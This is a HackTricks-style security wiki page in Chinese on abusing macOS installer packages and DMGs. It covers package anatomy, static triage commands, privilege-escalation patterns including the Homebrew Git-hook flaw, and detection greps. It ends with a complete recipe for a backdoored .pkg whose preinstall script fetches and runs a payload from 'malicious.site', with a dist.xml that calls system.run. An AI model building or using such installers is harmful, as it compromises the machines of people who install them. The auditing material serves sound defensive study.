# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg 基本信息

macOS **installer package**（也称为 `.pkg` 文件）是一种由 macOS 用于**分发软件**的文件格式。这些文件就像一个**包含软件正确安装和运行所需全部内容的盒子**。

package 文件本身是一个归档文件，其中包含将在目标计算机上**安装的文件和目录层级结构**。它还可以包含用于在安装前后执行任务的 **scripts**，例如设置配置文件或清理软件的旧版本。

### Package 结构

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**：自定义内容（标题、欢迎文本……）以及 script/安装检查
- **PackageInfo (xml)**：信息、安装要求、安装位置、要运行的 scripts 路径
- **Bill of materials (bom)**：要安装、更新或删除的文件列表及其文件权限
- **Payload (CPIO archive gzip compressed)**：从 PackageInfo 中的 `install-location` 安装的文件
- **Scripts (CPIO archive gzip compressed)**：安装前和安装后的 scripts，以及提取到临时目录中执行的其他资源。

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
为了在不手动解压的情况下查看 installer 的内容，你也可以使用免费工具 [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/)。

### 静态 triage 快捷方法

如果目标是进行分析，请尽量**避免先使用 `Installer.app` 打开软件包**。某些软件包会在 Installer 打开它们时立即执行代码（例如通过 `system.run()` 或 installer plug-ins），因此，离线提取通常是更安全的起点。
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## DMG 基本信息

DMG 文件，即 Apple 磁盘映像，是 Apple macOS 用于磁盘映像的一种文件格式。DMG 文件本质上是一个**可挂载的磁盘映像**（包含自身的文件系统），其中包含通常经过压缩、有时经过加密的原始块数据。当你打开 DMG 文件时，macOS 会将其**挂载为物理磁盘**，使你能够访问其中的内容。

> [!CAUTION]
> 请注意，**`.dmg`** 安装程序支持**非常多的格式**，过去其中一些包含的漏洞曾被滥用来获取 **kernel code execution**。

### 磁盘映像结构

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

DMG 文件的层次结构可能因内容而异。不过，对于应用程序 DMG，通常遵循以下结构：

- 顶层：这是磁盘映像的根目录，通常包含应用程序，以及可能指向 Applications 文件夹的链接。
- Application (.app)：这是实际的应用程序。在 macOS 中，应用程序通常是一个包含许多组成该应用程序的独立文件和文件夹的包。
- Applications 链接：这是 macOS 中 Applications 文件夹的快捷方式。这样设计是为了方便安装应用程序。你可以将 .app 文件拖到此快捷方式上，以安装该应用程序。

## 通过 pkg abuse 提权

### 从公共目录执行

如果预安装或后安装脚本执行诸如 **`/var/tmp/Installerutil`** 的文件，并且攻击者能够替换该文件，那么当安装程序调用它时，攻击者就可以提升权限。引用的演讲和 walkthrough 展示了这种不安全外部脚本模式的变体。<sup>[[1]](#references)</sup><sup>[[3]](#references)</sup><sup>[[4]](#references)</sup>

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

这是一个[公开函数](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg)，一些安装程序和更新程序会调用它来**以 root 身份执行某些内容**。此函数接受要**执行**的**文件**的**路径**作为参数；但是，如果攻击者能够**修改**该文件，就可以滥用其 root 执行权限来**提升权限**。
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
更多信息请查看此演讲：[https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)<sup>[[8]](#references)</sup>

### Environment 和 shebang abuse

现代 PackageKit 漏洞表明，installer scripts 通常会作为**trusted root code**执行，同时附近仍保留攻击者可控的上下文。审计 vendor packages 时，请特别注意：

- Shell interpreters，例如 `#!/bin/zsh` / `#!/bin/bash`
- `sudo -u $USER`、`launchctl asuser` 等调用，或任何信任 `$USER`、`$HOME`、`PATH`、`TMPDIR` 或相对路径的逻辑
- 可能加载用户可控 init files 或 libraries 的非 Shell interpreters
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
对于 2024 年 PackageKit root-environment bug（用户发起安装期间继承 `~/.zshenv` / `~/.bash*`），请参阅[通用 macOS privesc 页面](../macos-privilege-escalation.md)。如果软件包是 **Apple-signed**，同一个脚本 bug 可能变得与 **SIP/TCC** 相关，因为 `system_installd` 可能携带 `com.apple.rootless.install.heritable`；请参阅 [SIP 页面](../macos-security-protections/macos-sip.md)。<sup>[[5]](#references)</sup><sup>[[6]](#references)</sup>

### 有状态输入和隐式回调

不要将审查范围限制在明显的 command injection 上。当 root `preinstall`/`postinstall` 使用**安装前就已存在的状态**时，就可能跨越 trust boundary：例如 `/tmp` 或 `/var/tmp` 中可预测的文件、现有的用户可写安装目录树、配置文件、repository metadata，或之后传递给 `chown` 的用户名。<sup>[[9]](#references)[[10]](#references)</sup>

最近的两个 Homebrew installer flaws 展示了可复用的变体：

- **攻击者选择的所有权：** package-user override 从可预测的 `/var/tmp/.homebrew_pkg_user.plist` 中读取，但没有验证其 owner、mode、ACL、symlink 状态或 provenance。低权限用户可以选择自己的账户，之后的 root `postinstall` 会将 Homebrew tree 和 cache 的所有权递归转移给该账户。这是 privilege-assignment flaw，而不是 shell injection。<sup>[[9]](#references)</sup>
- **来自现有目录树的工具回调：** root `postinstall` 在一个明确允许其普通用户写入的安装中运行了 `git checkout`。因此，在其中植入可执行的 `.git/hooks/post-checkout`，就能将之后的 GUI/MDM package upgrade 转化为 root code execution。在 Intel 路径中，将打包的 `.git` directory 合并到现有 repository 还会保留攻击者添加的 hooks。<sup>[[10]](#references)</sup>

第二个 primitive 很容易在授权测试期间进行建模；只有当存在漏洞的 privileged installer 之后运行支持 hooks 的 Git operation 时，trigger 才会发生。<sup>[[10]](#references)</sup>
```bash
repo=/path/to/user-writable/install
mkdir -p "$repo/.git/hooks"
cat > "$repo/.git/hooks/post-checkout" <<'EOF'
#!/bin/sh
id > /tmp/pkg-post-checkout-context
EOF
chmod +x "$repo/.git/hooks/post-checkout"
# Wait for the privileged .pkg install/upgrade; do not invoke it as root just to test.
```
展开嵌套 packages，并将每个攻击者控制的 source 映射到特权 sink。除了直接执行外，还要搜索解析器、所有权变更以及带有 plug-in/hook 机制的工具。<sup>[[9]](#references)[[10]](#references)</sup>
```bash
PKG=Target.pkg
OUT=$(mktemp -d)
pkgutil --expand-full "$PKG" "$OUT"
grep -RniE '(/var/tmp|/tmp|defaults[[:space:]]+read|PlistBuddy|chown[[:space:]]+-R)' "$OUT"
grep -RniE '(^|[;&|[:space:]])(git|svn|hg|npm|pip|ruby|python)[[:space:]]' "$OUT"
grep -RniE '(checkout|reset|submodule|hooksPath|GIT_(DIR|CONFIG)|PYTHONPATH|RUBYOPT)' "$OUT"
```
为了加固系统，请将特权输入移入由 root 拥有的 staging directory，并在每次使用前立即验证每个路径（普通文件、预期的所有者/模式、无不安全 ACL，且不存在 symlink traversal）。避免从不受信任的身份递归更改所有权。当 Git 必须在预先存在的 tree 上运行时，请显式抑制 callbacks（例如，`git -c core.hooksPath=/dev/null ...`），或在调用 Git 前以原子方式替换 repository metadata。<sup>[[9]](#references)[[10]](#references)</sup>

### 通过挂载执行

如果 installer 将内容写入 `/tmp/fixedname/bla/bla`，就可以在 `/tmp/fixedname` 上使用 noowners **创建 mount**，从而能够在安装过程中**修改任意文件**，以滥用安装流程。

一个例子是 **CVE-2021-26089**，它成功**覆盖了一个 periodic script**，从而以 root 身份获得执行权限。更多信息请参阅演讲：[**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)<sup>[[7]](#references)</sup>

## 将 pkg 作为 malware

### 空 Payload

可以只生成一个包含 **pre 和 post-install scripts** 的 **`.pkg`** 文件，而不包含任何真实 payload，恶意代码仅存在于这些 scripts 中。<sup>[[2]](#references)</sup>

### Distribution xml 中的 JS

可以在 package 的 **distribution xml** 文件中添加 **`<script>`** tags，这些代码会被执行，并且可以使用 **`system.run`** **执行命令**：

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

对于 distribution packages，这通常取决于顶层的 `Distribution` 文件是否启用了 external scripts，例如设置 `allow-external-scripts="true"`。因此，仅检查 `preinstall` / `postinstall` 是不够的：**Distribution XML 本身**可能包含 `installation-check` / `volume-check` hooks，以及直接调用 `system.run()` / `system.runOnce()` 的执行路径。
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### 带后门的安装程序

使用 `dist.xml` 内部的 script 和 JS code 的恶意安装程序
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## References

- [1] [DEF CON 27 - 解包 Pkgs：深入了解 Macos Installer Packages 及常见安全漏洞](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [2] [OBTS v4.0：“macOS Installers 的狂野世界” - Tony Lambert](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [3] [DEF CON 27 - 解包 Pkgs：深入了解 MacOS Installer Packages](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [4] [RedTeamRecipe – macOS Red Teaming：利用 Installer Packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [5] [CVE-2024-27822：macOS PackageKit 权限提升](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [6] [利用 Apple-signed Packages 突破 SIP](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)
- [7] [OBTS v4.0：“Mount(ain) of Bugs” - Csaba Fitzl](https://www.youtube.com/watch?v=jSYPazD4VcE)
- [8] [DEF CON 25 - Patrick Wardle - macOS 上的 1000 个 Installers 之死，一切都坏掉了！](https://www.youtube.com/watch?v=lTOItyjTTkw)
- [9] [Homebrew macOS installer 信任用户可控的 package-user plist](https://github.com/Homebrew/brew/security/advisories/GHSA-59v8-x8q4-px5c)
- [10] [通过 macOS PKG postinstall 中的 Git hooks 执行 root 代码](https://github.com/Homebrew/brew/security/advisories/GHSA-6689-q779-c33m)
{{#include ../../../banners/hacktricks-training.md}}
